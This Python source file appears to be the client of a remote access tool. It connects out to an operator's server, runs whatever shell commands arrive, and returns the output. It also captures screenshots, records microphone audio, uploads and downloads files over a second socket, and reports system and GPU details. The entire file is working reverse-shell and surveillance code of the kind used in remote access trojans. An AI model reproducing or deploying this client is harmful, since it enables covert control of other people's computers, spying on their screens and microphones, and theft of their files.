import socket
import os
import subprocess
import sys
import re
import platform
from datetime import datetime
try:
    import pyautogui
    pyautogui_imported = True
except ImportError:
    pyautogui_imported = False

try:
    import sounddevice as sd
    from scipy.io import wavfile
    audio_supported = True
except ImportError:
    audio_supported = False

try:
    import psutil
    psutil_imported = True
except ImportError:
    psutil_imported = False

try:
    import GPUtil
    gpu_supported = True
except ImportError:
    gpu_supported = False

from tqdm import tqdm
from tabulate import tabulate

SERVER_HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
SERVER_PORT = 5003
BUFFER_SIZE = 1440
SEPARATOR = "<sep>"

class Client:
    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        self.socket = self.connect_to_server()
        self.cwd = None

    def connect_to_server(self, custom_port=None):
        s = socket.socket()
        port = custom_port if custom_port else self.port
        
        if self.verbose:
            print(f"Connecting to {self.host}:{port}")
        
        s.connect((self.host, port))
        
        if self.verbose:
            print("Connected.")
        
        return s

    def start(self):
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())
        
        while True:
            command = self.socket.recv(BUFFER_SIZE).decode()
            output = self.handle_command(command)
            
            if output == "abort":
                break
            elif output in ["exit", "quit"]:
                continue
            
            self.cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{self.cwd}"
            self.socket.sendall(message.encode())
        
        self.socket.close()

    def handle_command(self, command):
        if self.verbose:
            print(f"Executing command: {command}")
        
        if command.lower() in ["exit", "quit"]:
            return "exit"
        elif command.lower() == "abort":
            return "abort"
        elif (match := re.search(r"cd\s*(.*)", command)):
            return self.change_directory(match.group(1))
        elif (match := re.search(r"screenshot\s*(\S*)", command)):
            if pyautogui_imported:
                return self.take_screenshot(match.group(1))
            else:
                return "Display is not supported in this machine."
        elif (match := re.search(r"recordmic\s*(\S*)\.(\w+)\s*(\d*)", command)):
            if not audio_supported:
                return "Audio recording not supported (missing libraries)"
            
            audio_filename = f"{match.group(1)}.{match.group(2)}"
            try:
                seconds = int(match.group(3)) if match.group(3) else 5
            except ValueError:
                seconds = 5
            
            return self.record_audio(audio_filename, seconds=seconds)
        elif (match := re.search(r"download\s*(.*)", command)):
            filename = match.group(1).strip()
            if os.path.isfile(filename):
                self.send_file(filename)
                return f"The file {filename} is sent."
            else:
                return f"The file {filename} does not exist"
        elif (match := re.search(r"upload\s*(.*)", command)):
            filename = match.group(1).strip()
            self.receive_file()
            return f"The file {filename} is received."
        elif (match := re.search(r"sysinfo.*", command)):
            return self.get_sys_hardware_info()
        else:
            try:
                return subprocess.getoutput(command)
            except Exception as e:
                return f"Error executing command: {e}"

    def change_directory(self, path):
        if not path:
            return ""
        try:
            os.chdir(path)
            return ""
        except Exception as e:
            return str(e)

    def take_screenshot(self, output_path):
        try:
            if not pyautogui_imported:
                return "PyAutoGUI not installed"
            
            img = pyautogui.screenshot()
            if not output_path.endswith(".png"):
                output_path += ".png"
            
            img.save(output_path)
            output = f"Image saved to {output_path}"
            
            if self.verbose:
                print(output)
            
            return output
        except Exception as e:
            return f"Error taking screenshot: {e}"

    def record_audio(self, filename, sample_rate=16000, seconds=3):
        try:
            if not audio_supported:
                return "Audio libraries not installed"
            
            if not filename.endswith(".wav"):
                filename += ".wav"
            
            myrecording = sd.rec(int(seconds * sample_rate), 
                                samplerate=sample_rate, 
                                channels=2)
            sd.wait()
            wavfile.write(filename, sample_rate, myrecording)
            
            output = f"Audio saved to {filename}"
            if self.verbose:
                print(output)
            
            return output
        except Exception as e:
            return f"Error recording audio: {e}"

    def receive_file(self, port=5002):
        try:
            s = self.connect_to_server(custom_port=port)
            self._receive_file(s, verbose=self.verbose)
        except Exception as e:
            if self.verbose:
                print(f"Error receiving file: {e}")

    def send_file(self, filename, port=5002):
        try:
            s = self.connect_to_server(custom_port=port)
            self._send_file(s, filename, verbose=self.verbose)
        except Exception as e:
            if self.verbose:
                print(f"Error sending file: {e}")

    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096, verbose=False):
        try:
            received = s.recv(buffer_size).decode()
            filename, filesize = received.split(SEPARATOR)
            filename = os.path.basename(filename)
            filesize = int(filesize)
            
            if verbose:
                progress = tqdm(range(filesize), f"Receiving {filename}", 
                              unit="B", unit_scale=True, unit_divisor=1024)
            else:
                progress = None
            
            with open(filename, "wb") as f:
                while True:
                    bytes_read = s.recv(buffer_size)
                    if not bytes_read:
                        break
                    f.write(bytes_read)
                    if verbose and progress:
                        progress.update(len(bytes_read))
            
            if verbose and progress:
                progress.close()
        except Exception as e:
            if verbose:
                print(f"Error in _receive_file: {e}")
        finally:
            s.close()

    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
        try:
            filesize = os.path.getsize(filename)
            s.send(f"{filename}{SEPARATOR}{filesize}".encode())
            
            if verbose:
                progress = tqdm(range(filesize), f"Sending {filename}", 
                              unit="B", unit_scale=True, unit_divisor=1024)
            else:
                progress = None
            
            with open(filename, "rb") as f:
                while True:
                    bytes_read = f.read(buffer_size)
                    if not bytes_read:
                        break
                    s.sendall(bytes_read)
                    if verbose and progress:
                        progress.update(len(bytes_read))
            
            if verbose and progress:
                progress.close()
        except Exception as e:
            if verbose:
                print(f"Error in _send_file: {e}")
        finally:
            s.close()

    @classmethod
    def get_sys_hardware_info(cls):
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
        
        output = ""
        
        # Basic system info
        try:
            uname = platform.uname()
            output += "=" * 40 + "System Information" + "=" * 40 + "\n"
            output += f"System: {uname.system}\n"
            output += f"Node Name: {uname.node}\n"
            output += f"Release: {uname.release}\n"
            output += f"Version: {uname.version}\n"
            output += f"Machine: {uname.machine}\n"
            output += f"Processor: {uname.processor}\n"
        except:
            pass
        
        # CPU info using psutil
        if psutil_imported:
            try:
                output += "=" * 40 + "CPU Info" + "=" * 40 + "\n"
                output += f"Physical cores: {psutil.cpu_count(logical=False)}\n"
                output += f"Total cores: {psutil.cpu_count(logical=True)}\n"
                
                try:
                    cpufreq = psutil.cpu_freq()
                    output += f"Max Frequency: {cpufreq.max:.2f} Mhz\n"
                    output += f"Current Frequency: {cpufreq.current:.2f} Mhz\n"
                except:
                    pass
                
                output += "CPU Usage:\n"
                for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                    output += f"Core {i}: {percentage}%\n"
                output += f"Total CPU Usage: {psutil.cpu_percent()}%\n"
            except:
                pass
            
            # Memory info
            try:
                output += "=" * 40 + "Memory Information" + "=" * 40 + "\n"
                svmem = psutil.virtual_memory()
                output += f"Total: {get_size(svmem.total)}\n"
                output += f"Available: {get_size(svmem.available)}\n"
                output += f"Used: {get_size(svmem.used)}\n"
                output += f"Percentage: {svmem.percent}%\n"
            except:
                pass
        
        # GPU info
        if gpu_supported:
            try:
                output += "=" * 40 + "GPU Details" + "=" * 40 + "\n"
                gpus = GPUtil.getGPUs()
                list_gpus = []
                for gpu in gpus:
                    list_gpus.append([
                        gpu.id,
                        gpu.name,
                        f"{gpu.load*100}%",
                        f"{gpu.memoryFree}MB",
                        f"{gpu.memoryUsed}MB",
                        f"{gpu.memoryTotal}MB",
                        f"{gpu.temperature}°C"
                    ])
                output += tabulate(list_gpus, 
                                 headers=["id", "name", "load", "free memory", 
                                         "used memory", "total memory", "temperature"])
            except:
                pass
        
        if not output:
            output = "System information not available"
        
        return output

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python client.py <server_ip>")
        print("Example: python client.py 192.168.1.100")
        sys.exit(1)
    
    client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
    client.start()